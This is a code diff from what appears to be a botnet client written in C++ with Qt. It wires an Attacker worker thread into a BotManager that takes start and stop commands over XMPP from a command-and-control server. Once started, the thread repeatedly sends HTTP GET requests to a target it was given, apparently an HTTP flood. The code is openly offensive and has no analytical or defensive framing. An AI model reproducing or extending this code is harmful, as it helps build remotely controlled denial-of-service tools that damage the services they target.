@@ -2,6 +2,7 @@
 #include "global.h"
 #include "xmppclient.h"
 #include "bot.h"
+#include "attacker.h"
 #include "storagemanager.h"
 #include "getstatuscommand.h"
 #include "getbotstatecommand.h"
@@ -10,6 +11,7 @@
 #include "botstateresponse.h"
 #include "attackstartedresponse.h"
 #include "attackstoppedresponse.h"
+#include <QThread>
 #include <QNetworkAccessManager>
 #include <QNetworkRequest>
 #include <QNetworkReply>
@@ -80,6 +82,9 @@ void BotManager::commandReceivedOnBot(Message *command)
         _bot -> setState(AttackInProgress);
         _bot -> setAttack(Attack(startAttackCommand -> id(), startAttackCommand -> target()));
 
+        _attacker -> setTarget(_bot -> attack().target());
+        _attackerThread -> start();
+
         writeEvent(QString("Iniciando ataque (id: %1 target: %2)")
                    .arg(_bot -> attack().id())
                    .arg(_bot -> attack().target()));
@@ -95,6 +100,9 @@ void BotManager::commandReceivedOnBot(Message *command)
         _bot -> setState(WaitingForCommand);
         _bot -> setAttack(Attack());
 
+        _attackerThread -> quit();
+        _attackerThread -> wait();
+
         writeEvent(QString("Enviado ATTACK_STOPPED_RES [1:1] a %1").arg(command -> from()));
     } else
         isValid = false;
@@ -105,6 +113,15 @@ void BotManager::commandReceivedOnBot(Message *command)
     }
 
     delete command;
+}
+
+void BotManager::attackDone()
+{
+    writeEvent(QString("Enviada peticion HTTP GET a %1").arg(_bot -> attack().target()));
+
+    _attackerThread -> quit();
+    _attackerThread -> wait();
+    _attackerThread -> start();
 }
 
 void BotManager::finishedOnNetworkAccessManager(QNetworkReply *reply)
@@ -126,6 +143,11 @@ BotManager::BotManager()
 
     _bot = new Bot;
 
+    _attackerThread = new QThread;
+
+    _attacker = new Attacker;
+    _attacker -> moveToThread(_attackerThread);
+
     _networkAccessManager = new QNetworkAccessManager(this);
 
     createConnections();
@@ -138,6 +160,13 @@ BotManager::~BotManager()
 {
     disconnectFromCC();
 
+    delete _attacker;
+
+    _attackerThread -> quit();
+    _attackerThread -> wait();
+
+    delete _attackerThread;
+
     delete _xmppClient;
     delete _bot;
 }
@@ -148,6 +177,10 @@ void BotManager::createConnections()
             this, SLOT(readyOnXmppClient()));
     connect(_xmppClient, SIGNAL(commandReceived(Message *)),
             this, SLOT(commandReceivedOnBot(Message *)));
+    connect(_attackerThread, SIGNAL(started()),
+            _attacker, SLOT(attack()));
+    connect(_attacker, SIGNAL(done()),
+            this, SLOT(attackDone()));
     connect(_networkAccessManager, SIGNAL(finished(QNetworkReply *)),
             this, SLOT(finishedOnNetworkAccessManager(QNetworkReply *)));
 }
